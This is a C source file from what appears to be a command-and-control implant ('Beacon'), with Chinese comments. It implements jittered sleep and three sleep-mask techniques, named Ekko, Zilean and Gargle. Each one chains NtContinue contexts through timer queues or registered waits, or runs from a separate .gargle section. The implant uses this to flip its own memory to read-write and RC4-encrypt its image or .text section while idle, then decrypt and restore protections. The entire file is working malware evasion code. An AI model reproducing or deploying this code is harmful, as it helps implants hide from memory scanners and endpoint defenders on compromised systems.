#include "beacon_sleep.h"

#include "beacon_crypto.h"
#include "beacon_runtime.h"

/*
 * Sleep 模块负责普通 sleep、jitter 计算和可选的 x64 sleep 混淆。
 * RuntimeGate 用于避免 worker/BOF 等活动线程与内存加密窗口重叠。
 */

#ifndef WT_EXECUTEINTIMERTHREAD
#define WT_EXECUTEINTIMERTHREAD 0x00000020
#endif

#ifndef WT_EXECUTEINWAITTHREAD
#define WT_EXECUTEINWAITTHREAD 0x00000004
#endif

#ifndef WT_EXECUTEONLYONCE
#define WT_EXECUTEONLYONCE 0x00000008
#endif

typedef struct SleepObfRegion {
    PVOID base;
    SIZE_T size;
} SleepObfRegion;

typedef struct SleepObfImageRegions {
    SleepObfRegion image;
    SleepObfRegion text;
    DWORD restore_protect;
} SleepObfImageRegions;

/* 根据基础 sleep 和 jitter 计算本轮休眠时间 */
DWORD SleepCalculateWithJitter(const Profile* profile)
{
    INT jitter;
    INT sleep_ms;

    if (!profile || profile->sleep_ms <= 0) return 0;

    sleep_ms = profile->sleep_ms;
    jitter = profile->jitter;
    if (jitter < 0) jitter = 0;
    if (jitter > 100) jitter = 100;

    if (jitter > 0) {
        UINT32 r;
        if (CryptoRandomU32(&r)) {
            sleep_ms += (INT)(((INT64)(r % (UINT32)(jitter + 1)) * sleep_ms) / 100);
        }
    }

    return sleep_ms > 0 ? (DWORD)sleep_ms : 0;
}

static DWORD BeaconWaitPlain(BeaconContext* ctx, const HANDLE* handles,
                             DWORD count, DWORD timeout_ms)
{
    if (handles && count > 0) {
        return WaitForMultipleObjects(count, handles, FALSE, timeout_ms);
    }

    if (timeout_ms == 0) {
        return WAIT_TIMEOUT;
    }

    if (ctx && ctx->api.pfnSleep) {
        ctx->api.pfnSleep(timeout_ms);
    } else {
        Sleep(timeout_ms);
    }
    return WAIT_TIMEOUT;
}

/* sleep 混淆定时器链本身需要消耗的估算时间 */
static DWORD SleepObfEstimatedOverhead(VOID)
{
    return SLEEP_OBF_SETUP_BUDGET + SLEEP_OBF_TIMER_STAGE_COUNT * SLEEP_OBF_TIMER_STEP_MS;
}

/* 优先使用 profile patch 中的预计算 layout，避免依赖已被清理的 PE header */
static BOOL SleepObfFindImageRegionsByLayout(BeaconContext* ctx, SleepObfImageRegions* regions)
{
    const SleepObfImageLayout* layout;
    BYTE* base;
    BYTE* anchor;

    if (!ctx || !regions || !ctx->image_base) return FALSE;

    layout = &ctx->profile.sleep_layout;
    if (!layout->valid || layout->image_size == 0 || layout->text_size == 0 ||
        layout->text_rva >= layout->image_size ||
        layout->text_size > layout->image_size - layout->text_rva) {
        return FALSE;
    }

    base = (BYTE*)ctx->image_base;
    anchor = (BYTE*)&SleepObfFindImageRegionsByLayout;
    if (anchor < base || anchor >= base + layout->image_size) {
        return FALSE;
    }

    regions->image.base = base;
    regions->image.size = (SIZE_T)layout->image_size;
    regions->text.base = base + layout->text_rva;
    regions->text.size = (SIZE_T)layout->text_size;
    regions->restore_protect = layout->text_protect ? layout->text_protect : PAGE_EXECUTE_READ;
    return TRUE;
}

/* 定位当前模块整体映像和 .text 区域，供后续加密/恢复保护使用 */
static BOOL SleepObfFindImageRegions(BeaconContext* ctx, SleepObfImageRegions* regions)
{
    HMODULE module;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;

    if (!ctx || !regions) return FALSE;
    ZeroMemory(regions, sizeof(*regions));

    if (SleepObfFindImageRegionsByLayout(ctx, regions)) {
        return TRUE;
    }

    module = (HMODULE)ctx->image_base;
    if (!module) {
        module = ctx->api.pfnGetModuleHandleW ? ctx->api.pfnGetModuleHandleW(NULL) : GetModuleHandleW(NULL);
    }
    if (!module) return FALSE;

    dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    if (nt->OptionalHeader.SizeOfImage == 0) return FALSE;

    regions->image.base = module;
    regions->image.size = (SIZE_T)nt->OptionalHeader.SizeOfImage;
    regions->text = regions->image;
    regions->restore_protect = PAGE_EXECUTE_READWRITE;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
            if (size == 0) return FALSE;
            regions->text.base = (PVOID)((BYTE*)module + sec[i].VirtualAddress);
            regions->text.size = (SIZE_T)size;
            regions->restore_protect = PAGE_EXECUTE_READ;
            break;
        }
    }
    return TRUE;
}

#ifdef _WIN64
/* 检查 Ekko 所需的动态 API 是否全部可用 */
static BOOL EkkoHasApi(BeaconContext* ctx)
{
    return ctx &&
           ctx->api.pfnVirtualProtect &&
           ctx->api.pfnCreateEventW &&
           ctx->api.pfnSetEvent &&
           ctx->api.pfnRtlCreateTimerQueue &&
           ctx->api.pfnRtlCreateTimer &&
           ctx->api.pfnRtlDeleteTimerQueue &&
           ctx->api.pfnWaitForSingleObject &&
           ctx->api.pfnOpenProcess &&
           ctx->api.pfnGetCurrentProcessId &&
           ctx->api.pfnCloseHandle &&
           ctx->api.pfnRtlCaptureContext &&
           ctx->api.pfnNtContinue &&
           ctx->api.pfnSystemFunction032;
}

/* 基于捕获到的上下文构造一次 NtContinue 调用帧 */
static VOID SleepObfPrepareContext(CONTEXT* dst, const CONTEXT* base, PVOID rip,
                                   ULONG_PTR rcx, ULONG_PTR rdx,
                                   ULONG_PTR r8, ULONG_PTR r9)
{
    *dst = *base;
    dst->Rip = (DWORD64)(ULONG_PTR)rip;
    dst->Rsp = base->Rsp - sizeof(ULONG_PTR);
    dst->Rcx = (DWORD64)rcx;
    dst->Rdx = (DWORD64)rdx;
    dst->R8 = (DWORD64)r8;
    dst->R9 = (DWORD64)r9;
}

/* 执行 Ekko wait：加密映像、等待事件/超时、解密并恢复 .text 保护 */
static BOOL EkkoWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD wait_ms)
{
    SleepObfImageRegions regions;
    BYTE key_bytes[16];
    MY_USTRING data;
    MY_USTRING key;
    CONTEXT timer_ctx;
    CONTEXT ctxs[SLEEP_OBF_TIMER_STAGE_COUNT];
    HANDLE capture_timer = NULL;
    HANDLE signal_timer = NULL;
    HANDLE timers[SLEEP_OBF_TIMER_STAGE_COUNT] = { 0 };
    HANDLE queue = NULL;
    HANDLE timer_event = NULL;
    HANDLE start_event = NULL;
    HANDLE done_event = NULL;
    DWORD old_protect = 0;
    DWORD tmp_protect = 0;
    DWORD masked_wait_ms;
    DWORD overhead = SleepObfEstimatedOverhead();
    DWORD delay = 0;
    BOOL ok = FALSE;
    UINT i;

    if (!EkkoHasApi(ctx) || !handles || count == 0 ||
        wait_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
        return FALSE;
    }
    if (!SleepObfFindImageRegions(ctx, &regions)) {
        return FALSE;
    }
    if (!CryptoRandom(key_bytes, sizeof(key_bytes))) {
        return FALSE;
    }

    data.Length = (DWORD)regions.image.size;
    data.MaximumLength = (DWORD)regions.image.size;
    data.Buffer = regions.image.base;
    key.Length = sizeof(key_bytes);
    key.MaximumLength = sizeof(key_bytes);
    key.Buffer = key_bytes;
    masked_wait_ms = 0;

    start_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    timer_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    done_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    if (!start_event || !timer_event || !done_event ||
        ctx->api.pfnRtlCreateTimerQueue(&queue) < 0 || !queue) {
        goto cleanup;
    }
    ZeroMemory(&timer_ctx, sizeof(timer_ctx));
    timer_ctx.ContextFlags = CONTEXT_FULL;

    if (ctx->api.pfnRtlCreateTimer(queue, &capture_timer,
                                   (WAITORTIMERCALLBACK)ctx->api.pfnRtlCaptureContext,
                                   &timer_ctx,
                                   delay += SLEEP_OBF_TIMER_STEP_MS,
                                   0, WT_EXECUTEINTIMERTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnRtlCreateTimer(queue, &signal_timer,
                                   (WAITORTIMERCALLBACK)ctx->api.pfnSetEvent,
                                   timer_event,
                                   delay += SLEEP_OBF_TIMER_STEP_MS,
                                   0, WT_EXECUTEINTIMERTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnWaitForSingleObject(timer_event, 2000) != WAIT_OBJECT_0) {
        goto cleanup;
    }
    masked_wait_ms = wait_ms + delay;

    /* 定时器链阶段：等待启动 → 改写保护 → 加密 → 休眠 → 解密 → 恢复保护 → 通知完成 */
    SleepObfPrepareContext(&ctxs[0], &timer_ctx,
                       ctx->api.pfnWaitForSingleObject,
                       (ULONG_PTR)start_event, INFINITE, 0, 0);
    SleepObfPrepareContext(&ctxs[1], &timer_ctx,
                       ctx->api.pfnVirtualProtect,
                       (ULONG_PTR)regions.image.base, (ULONG_PTR)regions.image.size, PAGE_READWRITE, (ULONG_PTR)&old_protect);
    SleepObfPrepareContext(&ctxs[2], &timer_ctx,
                       ctx->api.pfnSystemFunction032,
                       (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[3], &timer_ctx,
                       WaitForMultipleObjects,
                       count, (ULONG_PTR)handles, FALSE, masked_wait_ms);
    SleepObfPrepareContext(&ctxs[4], &timer_ctx,
                       ctx->api.pfnSystemFunction032,
                       (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[5], &timer_ctx,
                       ctx->api.pfnVirtualProtect,
                       (ULONG_PTR)regions.text.base, (ULONG_PTR)regions.text.size, regions.restore_protect, (ULONG_PTR)&tmp_protect);
    SleepObfPrepareContext(&ctxs[6], &timer_ctx,
                       ctx->api.pfnSetEvent,
                       (ULONG_PTR)done_event, 0, 0, 0);

    for (i = 0; i < SLEEP_OBF_TIMER_STAGE_COUNT; ++i) {
        if (ctx->api.pfnRtlCreateTimer(queue, &timers[i],
                                       (WAITORTIMERCALLBACK)ctx->api.pfnNtContinue,
                                       &ctxs[i],
                                       delay += SLEEP_OBF_TIMER_STEP_MS,
                                       0, WT_EXECUTEINTIMERTHREAD) < 0) {
            goto cleanup;
        }
    }

    ctx->api.pfnSetEvent(start_event);
    ok = ctx->api.pfnWaitForSingleObject(done_event, wait_ms + overhead + 5000) == WAIT_OBJECT_0;

cleanup:
    if (queue) {
        if (!ok && start_event) {
            ctx->api.pfnSetEvent(start_event);
        }
        ctx->api.pfnRtlDeleteTimerQueue(queue);
    }
    if (start_event) CloseHandle(start_event);
    if (timer_event) CloseHandle(timer_event);
    if (done_event) CloseHandle(done_event);
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&data, sizeof(data));
    return ok;
}

/* 检查 Zilean 所需的动态 API 是否全部可用 */
static BOOL ZileanHasApi(BeaconContext* ctx)
{
    return ctx &&
           ctx->api.pfnVirtualProtect &&
           ctx->api.pfnCreateEventW &&
           ctx->api.pfnSetEvent &&
           ctx->api.pfnRtlRegisterWait &&
           ctx->api.pfnRtlDeregisterWait &&
           ctx->api.pfnWaitForSingleObject &&
           ctx->api.pfnOpenProcess &&
           ctx->api.pfnGetCurrentProcessId &&
           ctx->api.pfnCloseHandle &&
           ctx->api.pfnRtlCaptureContext &&
           ctx->api.pfnNtContinue &&
           ctx->api.pfnSystemFunction032;
}

/* 执行 Zilean wait：通过 RtlRegisterWait 调度 NtContinue 上下文链 */
static BOOL ZileanWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD wait_ms)
{
    SleepObfImageRegions regions;
    BYTE key_bytes[16];
    MY_USTRING data;
    MY_USTRING key;
    CONTEXT wait_ctx;
    CONTEXT ctxs[SLEEP_OBF_TIMER_STAGE_COUNT];
    HANDLE waits[SLEEP_OBF_TIMER_STAGE_COUNT + 2] = { 0 };
    HANDLE wait_event = NULL;
    HANDLE timer_event = NULL;
    HANDLE start_event = NULL;
    HANDLE done_event = NULL;
    DWORD old_protect = 0;
    DWORD tmp_protect = 0;
    DWORD overhead = SleepObfEstimatedOverhead();
    DWORD delay = 0;
    BOOL ok = FALSE;
    UINT i;

    if (!ZileanHasApi(ctx) || !handles || count == 0 ||
        wait_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
        return FALSE;
    }
    if (!SleepObfFindImageRegions(ctx, &regions)) {
        return FALSE;
    }
    if (!CryptoRandom(key_bytes, sizeof(key_bytes))) {
        return FALSE;
    }

    data.Length = (DWORD)regions.image.size;
    data.MaximumLength = (DWORD)regions.image.size;
    data.Buffer = regions.image.base;
    key.Length = sizeof(key_bytes);
    key.MaximumLength = sizeof(key_bytes);
    key.Buffer = key_bytes;

    wait_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    start_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    timer_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    done_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    if (!wait_event || !start_event || !timer_event || !done_event) {
        goto cleanup;
    }
    ZeroMemory(&wait_ctx, sizeof(wait_ctx));
    wait_ctx.ContextFlags = CONTEXT_FULL;

    if (ctx->api.pfnRtlRegisterWait(&waits[0],
                                    wait_event,
                                    (WAITORTIMERCALLBACK)ctx->api.pfnRtlCaptureContext,
                                    &wait_ctx,
                                    delay += SLEEP_OBF_TIMER_STEP_MS,
                                    WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnRtlRegisterWait(&waits[1],
                                    wait_event,
                                    (WAITORTIMERCALLBACK)ctx->api.pfnSetEvent,
                                    timer_event,
                                    delay += SLEEP_OBF_TIMER_STEP_MS,
                                    WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnWaitForSingleObject(timer_event, 2000) != WAIT_OBJECT_0) {
        goto cleanup;
    }

    /* Zilean 阶段：等待启动 → 改写保护 → 加密 → 休眠 → 解密 → 恢复保护 → 通知完成 */
    SleepObfPrepareContext(&ctxs[0], &wait_ctx,
                           ctx->api.pfnWaitForSingleObject,
                           (ULONG_PTR)start_event, INFINITE, 0, 0);
    SleepObfPrepareContext(&ctxs[1], &wait_ctx,
                           ctx->api.pfnVirtualProtect,
                           (ULONG_PTR)regions.image.base, (ULONG_PTR)regions.image.size, PAGE_READWRITE, (ULONG_PTR)&old_protect);
    SleepObfPrepareContext(&ctxs[2], &wait_ctx,
                           ctx->api.pfnSystemFunction032,
                           (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[3], &wait_ctx,
                           WaitForMultipleObjects,
                           count, (ULONG_PTR)handles, FALSE, wait_ms);
    SleepObfPrepareContext(&ctxs[4], &wait_ctx,
                           ctx->api.pfnSystemFunction032,
                           (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[5], &wait_ctx,
                           ctx->api.pfnVirtualProtect,
                           (ULONG_PTR)regions.text.base, (ULONG_PTR)regions.text.size, regions.restore_protect, (ULONG_PTR)&tmp_protect);
    SleepObfPrepareContext(&ctxs[6], &wait_ctx,
                           ctx->api.pfnSetEvent,
                           (ULONG_PTR)done_event, 0, 0, 0);

    for (i = 0; i < SLEEP_OBF_TIMER_STAGE_COUNT; ++i) {
        if (i == 4) {
            delay += wait_ms + SLEEP_OBF_TIMER_STEP_MS;
        } else {
            delay += SLEEP_OBF_TIMER_STEP_MS;
        }
        if (ctx->api.pfnRtlRegisterWait(&waits[i + 2],
                                        wait_event,
                                        (WAITORTIMERCALLBACK)ctx->api.pfnNtContinue,
                                        &ctxs[i],
                                        delay,
                                        WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD) < 0) {
            goto cleanup;
        }
    }

    ctx->api.pfnSetEvent(start_event);
    ok = ctx->api.pfnWaitForSingleObject(done_event, wait_ms + overhead + 5000) == WAIT_OBJECT_0;

cleanup:
    if (!ok && start_event) {
        ctx->api.pfnSetEvent(start_event);
    }
    for (i = 0; i < sizeof(waits) / sizeof(waits[0]); ++i) {
        if (waits[i]) {
            ctx->api.pfnRtlDeregisterWait(waits[i]);
        }
    }
    if (wait_event) CloseHandle(wait_event);
    if (start_event) CloseHandle(start_event);
    if (timer_event) CloseHandle(timer_event);
    if (done_event) CloseHandle(done_event);
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&data, sizeof(data));
    return ok;
}

#if defined(_MSC_VER)
#pragma comment(linker, "/SECTION:.gargle,ER")
#pragma code_seg(push, ".gargle")
#endif
/* 当前线程 sleep mask：仅加密 .text，执行窗口留在独立 .gargle 段，避免 NtContinue callback 链。 */
static BOOL GargleWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD wait_ms)
{
    SleepObfImageRegions regions;
    fnVirtualProtect pVirtualProtect;
    fnSystemFunction032 pSystemFunction032;
    fnWaitForSingleObject pWaitForSingleObject;
    fnWaitForMultipleObjects pWaitForMultipleObjects;
    fnSleep pSleep;
    BYTE key_bytes[16];
    MY_USTRING data;
    MY_USTRING key;
    BYTE* text_base;
    BYTE* self;
    DWORD old_protect = 0;
    DWORD tmp_protect = 0;
    DWORD wait_rc = WAIT_FAILED;
    BOOL protected_text = FALSE;
    BOOL masked = FALSE;
    BOOL unmasked = FALSE;
    BOOL restored = FALSE;

    if (!ctx || !SleepObfFindImageRegions(ctx, &regions) ||
        !regions.text.base || regions.text.size == 0 ||
        regions.text.size > 0xffffffffu) {
        return FALSE;
    }

    text_base = (BYTE*)regions.text.base;
    self = (BYTE*)&GargleWait;
    if (self >= text_base && self < text_base + regions.text.size) {
        return FALSE;
    }

    pVirtualProtect = ctx->api.pfnVirtualProtect;
    pSystemFunction032 = ctx->api.pfnSystemFunction032;
    pWaitForSingleObject = ctx->api.pfnWaitForSingleObject;
    pWaitForMultipleObjects = ctx->api.pfnWaitForMultipleObjects;
    pSleep = ctx->api.pfnSleep;
    if (!pVirtualProtect || !pSystemFunction032 ||
        ((handles && count > 1 && !pWaitForMultipleObjects) ||
         (handles && count == 1 && !pWaitForSingleObject && !pWaitForMultipleObjects) ||
         (!handles && !pSleep))) {
        return FALSE;
    }
    if (!CryptoRandom(key_bytes, sizeof(key_bytes))) {
        return FALSE;
    }

    data.Length = (DWORD)regions.text.size;
    data.MaximumLength = (DWORD)regions.text.size;
    data.Buffer = regions.text.base;
    key.Length = sizeof(key_bytes);
    key.MaximumLength = sizeof(key_bytes);
    key.Buffer = key_bytes;

    protected_text = pVirtualProtect(regions.text.base, regions.text.size,
                                     PAGE_READWRITE, &old_protect);
    if (!protected_text) {
        goto cleanup;
    }

    masked = NT_SUCCESS(pSystemFunction032(&data, &key));
    if (!masked) {
        goto cleanup;
    }

    if (handles && count > 0) {
        if (count == 1 && pWaitForSingleObject) {
            wait_rc = pWaitForSingleObject(handles[0], wait_ms);
        } else {
            wait_rc = pWaitForMultipleObjects(count, handles, FALSE, wait_ms);
        }
    } else {
        pSleep(wait_ms);
        wait_rc = WAIT_TIMEOUT;
    }

    unmasked = NT_SUCCESS(pSystemFunction032(&data, &key));

cleanup:
    if (protected_text) {
        restored = pVirtualProtect(regions.text.base, regions.text.size,
                                   regions.restore_protect, &tmp_protect);
    }
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&data, sizeof(data));
    return masked && unmasked && restored && wait_rc != WAIT_FAILED;
}
#if defined(_MSC_VER)
#pragma code_seg(pop)
#endif
#endif

/* 等待 handles 或超时；必要时在等待窗口内执行 sleep obfuscation。 */
DWORD BeaconWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD timeout_ms)
{
    HANDLE local_handles[MAXIMUM_WAIT_OBJECTS];
#ifdef _WIN64
    ULONGLONG start;
    ULONGLONG elapsed;
    BOOL ok = FALSE;
#endif

    if (!handles || count == 0 || count > MAXIMUM_WAIT_OBJECTS ||
        timeout_ms == 0 || timeout_ms == INFINITE) {
        return BeaconWaitPlain(ctx, handles, count, timeout_ms);
    }
    CopyMemory(local_handles, handles, sizeof(HANDLE) * count);

#ifndef _WIN64
    return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
#else
    if (!ctx) {
        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
    }

    if (!ctx->profile.sleep_obf_enabled ||
        (ctx->profile.sleep_obf_technique != SLEEP_OBF_EKKO &&
         ctx->profile.sleep_obf_technique != SLEEP_OBF_ZILEAN &&
         ctx->profile.sleep_obf_technique != SLEEP_OBF_GARGLE) ||
        timeout_ms < SLEEP_OBF_MIN_MS) {
        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
    }
    if (ctx->profile.sleep_obf_technique != SLEEP_OBF_GARGLE &&
        timeout_ms <= SleepObfEstimatedOverhead() + SLEEP_OBF_MIN_MASK_MS) {
        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
    }

    if (!RuntimeSleepObfBegin(ctx)) {
        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
    }

    start = ctx->api.pfnGetTickCount64 ? ctx->api.pfnGetTickCount64() : GetTickCount64();
    switch (ctx->profile.sleep_obf_technique) {
    case SLEEP_OBF_EKKO:
        ok = EkkoWait(ctx, local_handles, count, timeout_ms);
        break;
    case SLEEP_OBF_ZILEAN:
        ok = ZileanWait(ctx, local_handles, count, timeout_ms);
        break;
    case SLEEP_OBF_GARGLE:
        ok = GargleWait(ctx, local_handles, count, timeout_ms);
        break;
    default:
        ok = FALSE;
        break;
    }

    if (!ok) {
        RuntimeSleepObfEnd(ctx);
        elapsed = (ctx->api.pfnGetTickCount64 ? ctx->api.pfnGetTickCount64() : GetTickCount64()) - start;
        if (elapsed < timeout_ms) {
            return BeaconWaitPlain(ctx, local_handles, count, (DWORD)(timeout_ms - elapsed));
        }
        return BeaconWaitPlain(ctx, local_handles, count, 0);
    }
    RuntimeSleepObfEnd(ctx);
    return BeaconWaitPlain(ctx, local_handles, count, 0);
#endif
}

/* Beacon 主循环调用的休眠入口，按配置选择普通 Sleep 或 sleep 混淆技术 */
VOID BeaconSleep(BeaconContext* ctx)
{
    HANDLE wake_event;
    DWORD sleep_ms;

    if (!ctx) return;

    sleep_ms = SleepCalculateWithJitter(&ctx->profile);
    if (sleep_ms == 0) return;

    wake_event = ctx->runtime.wake_event;
    if (wake_event) {
        BeaconWait(ctx, &wake_event, 1, sleep_ms);
    } else {
        BeaconWaitPlain(ctx, NULL, 0, sleep_ms);
    }
}
